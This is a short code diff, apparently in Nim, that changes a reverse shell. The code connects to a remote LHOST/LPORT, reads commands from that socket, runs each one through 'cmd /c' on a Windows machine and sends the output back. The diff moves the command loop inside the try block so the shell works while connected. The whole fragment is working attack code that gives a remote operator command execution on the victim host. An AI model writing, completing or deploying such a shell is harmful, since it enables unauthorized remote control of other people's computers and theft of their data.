@@ -7,14 +7,14 @@ var
 
 try:
     sock.connect(LHOST, LPORT)
+
+    while true:
+        let cmd = sock.recvLine()
+        if cmd == "exit":
+            break
+        let result = execProcess("cmd /c " & cmd)
+        sock.send(result)
 except:
     raise
 finally:
     sock.close
-
-while true:
-    let cmd = sock.recvLine()
-    if cmd == "exit":
-        break
-    let result = execProcess("cmd /c " & cmd)
-    sock.send(result)
